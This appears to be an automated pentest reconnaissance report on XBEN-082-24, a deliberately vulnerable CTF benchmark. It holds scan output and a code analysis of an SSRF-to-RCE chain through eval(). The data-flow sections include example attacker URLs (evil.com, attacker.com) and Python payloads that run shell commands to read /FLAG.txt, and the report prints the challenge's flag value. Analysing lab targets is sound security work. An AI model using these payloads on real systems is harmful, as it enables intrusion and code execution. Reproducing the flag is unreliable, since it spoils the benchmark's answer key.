# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-28 13:34 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000030s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Caddy httpd
|_http-server-header: Caddy
|_http-title: Site doesn't have a title.
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp       CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Home - CUPS 2.3.4
9999/tcp  open  http      SimpleHTTPServer 0.6 (Python 3.12.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.10
|_http-title: Directory listing for /
49158/tcp open  http      Golang net/http server
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Tue, 28 Oct 2025 20:34:32 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Tue, 28 Oct 2025 20:34:17 GMT
|     Content-Length: 14
|_    auth required
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port49158-TCP:V=7.97%I=7%D=10/28%Time=690128C9%P=arm-apple-darwin24.4.0
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\n
SF:Content-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x
SF:20'none';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20scr
SF:ipt-src-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nTailscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-
SF:gec2eb9730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x2
SF:0DENY\r\nDate:\x20Tue,\x2028\x20Oct\x202025\x2020:34:17\x20GMT\r\nConte
SF:nt-Length:\x2014\r\n\r\nauth\x20required\n")%r(HTTPOptions,192,"HTTP/1\
SF:.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-src\x2
SF:0'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x20scri
SF:pt-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailscale-Ver
SF:sion:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Tue,\x2028\x20Oct\x20202
SF:5\x2020:34:17\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20required\n
SF:")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,192,"HTT
SF:P/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x20
SF:script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailscale
SF:-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options:\
SF:x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Tue,\x2028\x20Oct\x2
SF:02025\x2020:34:32\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requir
SF:ed\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.55 seconds


## Subdomain Discovery (subfinder)
Status: success
fndlync01.5ninesdata.localhost
autodiscover.localhost
mse-ca-mail.corp.mse.localhost
autodiscover.regency.localhost
mail.regency.localhost
exchvm.nwcnet.localhost
naeu2.naeuinc.localhost
sbs.allsaintsschool.localhost
server2.hunter.localhost
mail03.regency.localhost
owa.regency.localhost
www.localhost
server02.counterintel.localhost
mail.localhost
mail02.regency.localhost
tools.sonoma.edu.localhost


## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:41663[0m [200 OK] [1mHTML5[0m, [1mHTTPServer[0m[[1m[36mnginx/1.29.2[0m], [1mIP[0m[[0m[22m::1[0m], [1mScript[0m, [1mTitle[0m[[1m[33mAPI Dashboard[0m], [1mnginx[0m[[1m[32m1.29.2[0m]

## Code Analysis
# Penetration Test Code Analysis - XBEN-082-24

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All subsequent tasks must adhere to this scope. Before reporting any finding (e.g., an entry point, a vulnerability sink), verification has been performed to ensure it meets the "In-Scope" criteria.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints.
- Endpoints requiring authentication via the application's standard login mechanisms.
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code.

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `go run ./cmd/...`, `python scripts/...`).
- A development environment's internal tooling (e.g., a "run script" button in an IDE).
- CI/CD pipeline scripts or build tools (e.g., Dagger build definitions).
- Database migration scripts, backup tools, or maintenance utilities.
- Local development servers, test harnesses, or debugging utilities.
- Static files or scripts that require manual opening in a browser (not served by the application).

---

## 1. Executive Summary

XBEN-082-24 is a deliberately vulnerable CTF challenge implementing a microservices architecture with critical security deficiencies. The application consists of three Docker containers: an NGINX reverse proxy and two Flask services (flask_app and flask_api). The security posture is **CRITICALLY INSECURE** by design, with **NO AUTHENTICATION, NO AUTHORIZATION**, and **MULTIPLE SEVERE CODE EXECUTION VULNERABILITIES**.

The most critical attack surface involves a **chained SSRF-to-RCE vulnerability** that allows complete server compromise. An attacker can control the API URL through an unvalidated endpoint (`/api/set`), cause the Flask application to fetch from an attacker-controlled server, and then execute arbitrary Python code via an unsafe `eval()` call. This vulnerability chain provides direct access to the CTF flag stored at `/FLAG.txt` in the flask_app container.

Additional security failures include: Flask applications running with `debug=True` in production (exposing interactive debuggers), world-writable configuration files (777 permissions on `/tmp/name` and `/tmp/apiurl`), no HTTPS/TLS encryption, hardcoded secrets in version control, and complete absence of input validation. The application represents a realistic but intentionally exploitable attack scenario designed to demonstrate modern web application vulnerability chains.

**Key Architectural Decisions with Security Impact:**
- **Stateful filesystem configuration**: Using world-writable files (`/tmp/apiurl`, `/tmp/name`) for state management creates a persistent attack vector
- **Dynamic code execution pattern**: Fetching and executing code from remote URLs (`eval(json.loads(script)["script"])`) violates secure coding principles
- **No security boundaries**: All services communicate without authentication, and external traffic flows directly to vulnerable endpoints
- **Debug mode in production**: Flask apps expose interactive debuggers that provide additional code execution paths

---

## 2. Architecture & Technology Stack

### Framework & Language

**Primary Technologies:**
- **Python 3.8-slim** (Debian-based) - Backend services
- **Flask 3.0.3** - Web framework for both flask_app and flask_api
- **NGINX Alpine** - Reverse proxy with NJS (JavaScript) module for dynamic routing
- **Docker Compose** - Container orchestration

**Dependencies (Security-Relevant):**
- **requests library** (Python HTTP client) - Used in flask_app for outbound requests, vulnerable to SSRF
- **nginx-module-njs** - Enables JavaScript execution in NGINX, handles user input without validation
- **No security libraries**: No Flask-Login, Flask-WTF, Flask-CORS, Flask-Limiter, or cryptography packages

**Configuration Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml` - Service orchestration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/requirements.txt` - Flask==3.0.3, requests
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/requirements.txt` - Flask==3.0.3

**Security Implications:**
- Python 3.8 reached end-of-life in October 2024, no longer receives security updates
- Flask 3.0.3 running with `debug=True` exposes Werkzeug interactive debugger (PIN bypass vulnerabilities exist)
- The `requests` library with no version pinning could pull vulnerable versions
- NGINX NJS module provides a unique attack surface where JavaScript controls routing logic and file I/O

### Architectural Pattern

**Type:** Microservices Architecture with Reverse Proxy Gateway

**Service Topology:**
```
Internet (Port 80/8080/8081)
         ↓
    [NGINX Container]
    - Reverse proxy/API gateway
    - NJS JavaScript runtime
    - Static file serving
         ↓
    ┌────┴────┐
    ↓         ↓
[flask_app]  [flask_api]
Port 8080    Port 8081
(Internal)   (Internal)
```

**Trust Boundary Analysis:**

1. **External → NGINX (Port 80)**: PRIMARY ATTACK SURFACE
   - All user input enters through NGINX
   - No authentication required
   - Query parameters flow directly to NJS functions without validation
   - Trust assumption: None (correctly assumes all external input is hostile)

2. **NGINX → Flask Services**: INTERNAL NETWORK
   - Docker internal network communication
   - Services trust requests from NGINX without verification
   - No mutual TLS or service authentication
   - Trust assumption: NGINX filters malicious requests (VIOLATED - no filtering exists)

3. **Flask_app → External URLs**: DANGEROUS OUTBOUND TRUST
   - Flask_app fetches from URLs stored by NGINX
   - No validation of URL destination
   - Trusts response content to be safe for eval()
   - Trust assumption: API URL points to trusted services (VIOLATED - attacker-controlled)

**Service Communication Pattern:**
- Request flow: Client → NGINX:80 → `/app` proxy → flask_app:8080 → Outbound HTTP → External API → eval()
- NGINX acts as both gateway and stateful configuration store (anti-pattern)
- Flask services use synchronous request-response (no message queues or async patterns)

**Privilege Escalation Paths:**

1. **URL Injection → SSRF → RCE**:
   - Start: Unauthenticated public endpoint (`/api/set`)
   - Privilege gain: Ability to control server-side HTTP requests
   - Final state: Arbitrary code execution as application user

2. **Debug Mode → Interactive Debugger**:
   - Start: Trigger exception in Flask app
   - Privilege gain: Access to Werkzeug debugger console
   - Final state: Code execution via debugger PIN bypass

3. **World-Writable Files → Configuration Tampering**:
   - Start: Access to nginx container or `/tmp` directory
   - Privilege gain: Modify `/tmp/apiurl` or `/tmp/name`
   - Final state: Control application behavior, trigger RCE

### Critical Security Components

**Reverse Proxy (NGINX):**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf`
- **NJS Handler:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js`
- **Security Role:** NONE - Acts as pass-through proxy without security controls
- **Missing Controls:** No rate limiting, no input validation, no security headers, no WAF rules

**Configuration State Management:**
- **Files:** `/tmp/name` (line 3, helper.js), `/tmp/apiurl` (line 4, helper.js)
- **Permissions:** 777 (world-writable) - Set in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/Dockerfile` line 7
- **Security Risk:** Any process can modify application configuration, enabling persistent attacks

**Flask Application (Main App):**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py`
- **Dangerous Function:** Line 11 - `eval(json.loads(script)["script"])`
- **Security Role:** NONE - No input validation, no authentication checks
- **Debug Mode:** Line 23 - `app.run(host='0.0.0.0', port=8080, debug=True)`

**Data Protection:**
- **Encryption:** NONE - All traffic over HTTP
- **Authentication:** NONE - No auth mechanisms implemented
- **Authorization:** NONE - No access control logic
- **Input Validation:** NONE - All user input accepted without sanitization

---

## 3. Authentication & Authorization Deep Dive

### Authentication Status: **COMPLETELY ABSENT**

This application has **NO AUTHENTICATION SYSTEM WHATSOEVER**. All endpoints are publicly accessible without any form of identity verification, credential validation, or access control.

### Authentication Mechanisms: NONE

**Code Analysis:**
```python
# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py (Lines 1-5)
from flask import Flask, redirect, url_for, render_template
import requests
import json

app = Flask(__name__)
# NO SECRET KEY CONFIGURED
# NO Flask-Login imported
# NO authentication decorators defined
```

**Missing Authentication Components:**
- No login/logout endpoints
- No signup or user registration
- No password reset functionality
- No session-based authentication
- No token-based authentication (JWT, OAuth)
- No API key validation
- No HTTP Basic Auth
- No multi-factor authentication (MFA/2FA)

**Security Implications:**
Every endpoint is accessible to any network client without identity verification. This enables:
- Anonymous execution of SSRF attacks via `/api/set`
- Anonymous access to RCE vulnerability via `/app`
- No audit trail of which attacker performed which action
- No ability to revoke access or ban malicious users
- No rate limiting per user (since users don't exist)

### API Endpoints Used for Authentication: NONE EXIST

The Entry Point Mapper Agent conducted an exhaustive search for authentication-related endpoints. **No authentication endpoints were found** in the following categories:
- Login endpoints (e.g., `/login`, `/auth`, `/signin`)
- Logout endpoints (e.g., `/logout`, `/signout`)
- Token refresh endpoints (e.g., `/token/refresh`, `/auth/refresh`)
- Password management endpoints (e.g., `/password/reset`, `/password/change`)
- SSO/OAuth callback endpoints (e.g., `/auth/callback`, `/oauth/callback`)
- Account creation endpoints (e.g., `/register`, `/signup`)

### Session Management: NONE IMPLEMENTED

**Session Cookie Configuration: MISSING**

The Flask application runs without a secret key, which is required for session management. The following critical security configurations are absent:

```python
# MISSING from /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py
app.secret_key = 'MISSING'  # Required for Flask sessions
app.config['SESSION_COOKIE_HTTPONLY'] = True   # MISSING - Prevents JavaScript access
app.config['SESSION_COOKIE_SECURE'] = True     # MISSING - Ensures HTTPS-only
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'  # MISSING - Prevents CSRF
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)  # MISSING - No timeout
```

**Session Cookie Flags: NOT CONFIGURED**

Searched configuration locations:
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` - No session configuration found
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/api/app.py` - No session configuration found
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` - No cookie security directives

**Vulnerability Impact:**
- Session fixation attacks are trivially possible (no session rotation)
- Session hijacking is possible (no HttpOnly flag)
- Man-in-the-middle attacks can steal sessions (no Secure flag, no HTTPS)
- Cross-site request forgery (CSRF) attacks are unmitigated (no SameSite flag)
- Sessions never expire (no timeout configured)

### Authorization Model: NONE IMPLEMENTED

**Role-Based Access Control (RBAC): NOT IMPLEMENTED**

No authorization logic exists anywhere in the codebase:
```python
# Example of completely open endpoint with no authorization
# /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py (Line 7-15)
@app.route('/app')
def home():
    # NO @login_required decorator
    # NO @permission_required decorator
    # NO role validation
    # NO user context checking
    api = requests.get('http://nginx/api/get').text
    script = requests.get(api).text
    eval_result = eval(json.loads(script)["script"])
    # CRITICAL: eval() executes code with application privileges
    # No check if user should have code execution rights
```

**Missing Authorization Controls:**
- No role definitions (admin, user, guest, etc.)
- No permission checking middleware
- No resource-level access control
- No ownership validation (e.g., "can user X access resource Y?")
- No attribute-based access control (ABAC)
- No access control lists (ACLs)

**Authorization Bypass Scenarios:**

Since no authorization exists, all "bypass" scenarios are actually the default behavior:
1. **Privilege Escalation via SSRF**: Any unauthenticated user can control server-side requests
2. **Code Execution via eval()**: Any unauthenticated user can execute arbitrary Python code
3. **Configuration Tampering**: Any user can modify `/tmp/apiurl` and `/tmp/name` via query parameters
4. **Flag Access**: Any user who achieves RCE can read `/FLAG.txt`

### Multi-Tenancy Security: NOT APPLICABLE

The application has no concept of tenants, users, or data isolation. All data is shared globally (stored in world-writable `/tmp` files accessible to all processes).

### SSO/OAuth/OIDC Flows: NOT IMPLEMENTED

**No Single Sign-On Integration:**
- No OAuth 2.0 providers (Google, GitHub, etc.)
- No OIDC (OpenID Connect) flows
- No SAML authentication
- No enterprise SSO integration

**Missing Security Validations:**

The application does not implement any SSO flows, but if it did, the following critical validations would be missing:

1. **State Parameter Validation**: N/A (no OAuth flows)
   - Should be validated to prevent CSRF attacks on OAuth flows
   - No code found validating state parameter correlation

2. **Nonce Validation**: N/A (no OIDC flows)
   - Should be validated in ID tokens to prevent replay attacks
   - No OIDC implementation found

3. **Callback Endpoint Security**: N/A (no callbacks exist)
   - Should validate redirect_uri matches registered URIs
   - Should use HTTPS for callback endpoints
   - Should implement PKCE (Proof Key for Code Exchange) for public clients

### Security Impact Summary

**Authentication Absence Impact:**
- **Attack Surface:** 11 public endpoints, 0 require authentication
- **Threat Model:** Unauthenticated remote attackers can access all functionality
- **Blast Radius:** Complete - any attacker can compromise the entire system
- **Compliance Impact:** Violates OWASP Top 10 #1 (Broken Access Control)

**Recommended Authentication Architecture (Not Implemented):**
1. Implement Flask-Login for session-based authentication
2. Add JWT tokens for API authentication
3. Configure secure session cookies with HttpOnly, Secure, SameSite flags
4. Implement role-based access control (RBAC)
5. Add MFA/2FA for privileged operations
6. Implement OAuth 2.0 for third-party integrations
7. Add API key authentication for service-to-service communication

---

## 4. Data Security & Storage

### Database Security: NO DATABASE EXISTS

**Database Implementation Status:** NONE

The application does not use any traditional database management system. Comprehensive searches for database components yielded no results:
- No database connection strings found
- No ORM frameworks detected (SQLAlchemy, Django ORM, Sequelize, etc.)
- No database clients imported (psycopg2, mysql-connector, pymongo, etc.)
- No migration files or schema definitions
- No database connection pooling configuration

**Data Storage Mechanisms Identified:**

1. **Filesystem-Based State Storage (Insecure)**:
   - **Location:** `/tmp/name` and `/tmp/apiurl` in NGINX container
   - **Managed by:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js`
   - **Permissions:** 777 (world-writable) - configured in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/Dockerfile` line 7
   - **Encryption:** NONE - plaintext file storage
   - **Access Control:** NONE - any process can read/write

2. **Container Filesystem Storage**:
   - **Location:** `/FLAG.txt` in flask_app container
   - **Created:** Build-time via Dockerfile at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/Dockerfile` lines 12-13
   - **Content:** CTF flag (sensitive secret)
   - **Protection:** NONE - standard file system permissions, no encryption

3. **In-Memory State (NJS Variables)**:
   - **Location:** JavaScript variables in NGINX NJS runtime
   - **Variables:** `name` and `apiURL` in helper.js
   - **Persistence:** Lost on container restart (ephemeral)
   - **Security:** No encryption, no access control

### Data Flow Security

**Sensitive Data Inventory:**

| Data Type | Location | Classification | Protection Level |
|-----------|----------|----------------|------------------|
| CTF Flag | `/FLAG.txt` | Secret/Critical | NONE - plaintext file |
| API URL | `/tmp/apiurl` | Configuration/High | NONE - 777 permissions |
| Name Parameter | `/tmp/name` | Configuration/Low | NONE - 777 permissions |
| Build Secrets | `.env` file | Secret/Critical | NONE - committed to git |

**Critical Data Flow #1: Flag Exposure**

```
Build Time:
  .env (FLAG variable)
    ↓
  docker-compose.yml (build arg injection)
    ↓
  app/Dockerfile (ARG FLAG, RUN echo $FLAG > /FLAG.txt)
    ↓
  /FLAG.txt in container image layer (EXPOSED in image history)

Runtime:
  Attacker achieves RCE via eval()
    ↓
  Executes: __import__('os').popen('cat /FLAG.txt').read()
    ↓
  Flag exfiltrated
```

**File References:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/.env` (line 1): `FLAG="flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}"`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/docker-compose.yml` (lines 22-23): Flag passed as build argument
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/Dockerfile` (lines 11-13): Flag written to filesystem

**Security Failures:**
1. **Plaintext Secret Storage:** Flag stored unencrypted in `.env` file
2. **Version Control Exposure:** `.env` file committed to git repository (visible in git history)
3. **Docker Image Exposure:** Flag embedded in image layer, visible via `docker history`
4. **No Secret Rotation:** Flag is static, no rotation mechanism
5. **No Encryption:** Flag written to filesystem in plaintext

**Critical Data Flow #2: SSRF Attack Vector**

```
Attacker Input:
  GET /api/set?url=http://evil.com/payload
    ↓
  NGINX helper.js set_api() function (line 39-48)
    ↓
  Writes to /tmp/apiurl (NO VALIDATION)
    ↓
  Flask app reads /tmp/apiurl (line 9)
    ↓
  requests.get(api).text (line 10) - SSRF
    ↓
  Response passed to eval() (line 11) - RCE
```

**File References:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (lines 39-48): Unvalidated URL write
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/app.py` (lines 9-11): SSRF and RCE execution

**Security Failures:**
1. **No Input Validation:** URL parameter accepted without validation
2. **Insufficient Output Encoding:** Response not sanitized before eval()
3. **Dangerous Data Flow:** User input → filesystem → HTTP request → code execution
4. **No Logging:** No audit trail of URL modifications or code execution

### Multi-Tenant Data Isolation

**Status:** NOT APPLICABLE

The application has no multi-tenancy implementation. All data is stored in global files accessible by all processes. If multi-tenancy were implemented, the following would be missing:
- Tenant ID validation in data access paths
- Row-level security mechanisms
- Tenant-specific encryption keys
- Cross-tenant access prevention logic
- Tenant data segregation in storage

### Encryption Analysis

**Encryption Status:** COMPLETELY ABSENT

**No Encryption at Any Layer:**

1. **Transport Layer (TLS/SSL): NOT CONFIGURED**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf`
   - All services listen on HTTP only (port 80, 8080, 8081)
   - No SSL certificate configuration
   - No HTTPS redirect
   - **Impact:** All traffic transmitted in cleartext, vulnerable to man-in-the-middle attacks

2. **Data at Rest: NOT ENCRYPTED**
   - `/FLAG.txt` stored in plaintext
   - `/tmp/apiurl` and `/tmp/name` stored in plaintext
   - No database encryption (no database exists)
   - Docker secrets not used (build-time ARG instead)

3. **Cryptographic Libraries: NONE DETECTED**
   - No `cryptography` library in requirements.txt
   - No `hashlib` usage for hashing
   - No `bcrypt`, `argon2`, or `pbkdf2` for password hashing (no passwords exist)
   - No key management system

**Secret Management Analysis:**

**Critical Finding: Hardcoded Secrets in Version Control**

1. **`.env` File Committed to Repository:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/.env` (line 1)
   - **Content:** `FLAG="flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}"`
   - **Risk:** Exposed to anyone with repository access
   - **Mitigation:** Should use `.gitignore` and external secret management

2. **Docker Build-Time Secret Exposure:**
   - **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/app/Dockerfile` (lines 11-13)
   - **Method:** `ARG FLAG` followed by `RUN echo -n $FLAG > /FLAG.txt`
   - **Risk:** Flag visible in `docker history` and image layers
   - **Mitigation:** Should use Docker secrets or multi-stage builds

3. **No Secret Rotation:**
   - Secrets are static and never rotated
   - No mechanism to update secrets without rebuilding images
   - No secret expiration policies

**Recommended Secret Management (Not Implemented):**
- HashiCorp Vault for secret storage
- Docker secrets for runtime secret injection
- Environment-specific secrets (dev/staging/prod)
- Secret rotation policies
- Secrets scanning in CI/CD
- `.gitignore` for `.env` files

### Data Protection Mechanisms: NONE

**Missing Data Security Controls:**

| Control Type | Status | Impact |
|-------------|--------|---------|
| Input Validation | ABSENT | Enables SSRF, XSS, injection attacks |
| Output Encoding | ABSENT | Enables XSS via template injection |
| SQL Injection Prevention | N/A | No database exists |
| File Upload Validation | N/A | No file upload endpoints |
| Secure Logging | ABSENT | No audit trail, no SIEM integration |
| Data Masking | ABSENT | Sensitive data logged in plaintext |
| Data Retention Policies | ABSENT | No automated data deletion |
| Backup Encryption | N/A | No backups configured |

**Compliance Impact:**

If this application processed real user data, it would violate:
- **GDPR**: No encryption, no data minimization, no consent management
- **PCI-DSS**: No encryption, no audit logging, no access controls
- **HIPAA**: No encryption, no access controls, no audit trails
- **SOC 2**: No security controls, no logging, no incident response

### Recommended Data Security Architecture (Not Implemented)

**Priority 1 (Critical):**
1. Remove flag from `.env` and git history (`git filter-branch`)
2. Implement Docker secrets for runtime secret injection
3. Change `/tmp/name` and `/tmp/apiurl` permissions from 777 to 600
4. Enable HTTPS/TLS on NGINX with valid certificates
5. Remove `debug=True` to prevent debugger information disclosure

**Priority 2 (High):**
6. Implement input validation for all user-supplied data
7. Add output encoding for template rendering
8. Implement audit logging for all sensitive operations
9. Add encryption for sensitive data at rest
10. Implement proper secret rotation mechanisms

**Priority 3 (Medium):**
11. Add database with proper encryption (if persistence needed)
12. Implement field-level encryption for sensitive data
13. Add data retention and deletion policies
14. Implement data masking for logs
15. Add SIEM integration for security monitoring

---

## 5. Attack Surface Analysis

### External Entry Points

The application exposes **11 network-accessible HTTP endpoints** through an NGINX reverse proxy on port 80. All endpoints are publicly accessible without authentication. The Entry Point Mapper Agent identified these endpoints by analyzing route definitions in NGINX configuration and Flask application code.

#### **Entry Point #1: Static Dashboard (Root)**

**Endpoint:** `GET /`  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (Lines 14-18)  
**Handler:** Static file serving from `/html/index.html`  
**Authentication Required:** None  
**Rate Limiting:** None  

**Description:**  
Serves the main application dashboard as a static HTML page. The dashboard contains JavaScript that interacts with other API endpoints to display application state (API URL, name parameter, eval result).

**Security Analysis:**
- Static content, low risk for server-side vulnerabilities
- No Content-Security-Policy (CSP) header, enabling potential XSS
- Served over HTTP (no TLS), vulnerable to man-in-the-middle attacks
- Frontend JavaScript in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/html/script.js` uses safe DOM methods (`textContent`), no dangerous sinks detected

**Potential Attack Vectors:**
- Reflected XSS if error messages are rendered without encoding
- Session hijacking if authentication were implemented (no HTTPS)
- Clickjacking (no X-Frame-Options header)

---

#### **Entry Point #2: Health Check (NGINX)**

**Endpoint:** `GET /healthcheck`  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (Lines 20-23)  
**Response:** `200 OK` with body "OK"  
**Authentication Required:** None  
**Rate Limiting:** None  

**Description:**  
Returns a simple "OK" response to indicate NGINX service health. Used by Docker Compose health check mechanism.

**Security Analysis:**
- Minimal attack surface (no user input processed)
- Information disclosure: Confirms service is running and accessible
- No sensitive information leaked in response

**Potential Attack Vectors:**
- Service fingerprinting for reconnaissance
- Denial-of-service target (no rate limiting)

---

#### **Entry Point #3: Set API URL (CRITICAL SSRF)**

**Endpoint:** `GET /api/set?url=<value>`  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/nginx.conf` (Lines 25-27)  
**Handler:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-082-24/nginx/conf.d/helper.js` (Lines 39-48)  
**Authentication Required:** None  
**Rate Limiting:** None  
**Input Validation:** **NONE**

**Code Snippet:**
```javascript
function set_api(r) {
    let args = r.args;
    if (args.url) {
        apiURL = args.url;  // NO VALIDATION - accepts any string
        fs.writeFileSync(apiURLFile, apiURL);  // Writes to /tmp/apiurl (777 permissions)
        r.return(200, "API URL set to: " + apiURL);
    } else {
        r.return(400, "Missing 'url' parameter");
    }
}
```

**Security Analysis - CRITICAL VULNERABILITY:**

This is the **primary attack vector** enabling the SSRF-to-RCE chain. The endpoint:
1. Accepts any URL without validation (no allowlist, no protocol restrictions)
2. Stores the URL in a world-writable file (`/tmp/apiurl` with 777 permissions)
3. The Flask app later fetches from this URL and executes the response via `eval()`

**Attack Vector Chain:**
```
Attacker → GET /api/set?url=http://attacker.com/payload.json
         → NGINX writes to /tmp/apiurl (persistent)
         → Victim visits /app endpoint
         → Flask fetches http://attacker.com/payload.json
         → Response: {"script": "__import__('os').system('cat /FLAG.txt')"}
         → Flask executes via eval() → RCE achieved
```

**Data Flow Analysis:**
- **Input Source:** HTTP query parameter `url` (attacker-controlled)
- **Validation:** NONE
- **Storage:** Filesystem `/tmp/apiurl` (persistent across requests)
- **Downstream Usage:** Flask app uses this URL for `requests.get()` (SSRF sink)

**Exploitability:** CRITICAL - Trivial to exploit
- No authentication required
- No CSRF protection
- URL persists, affecting all subsequent requests
- Chains with RCE vulnerability

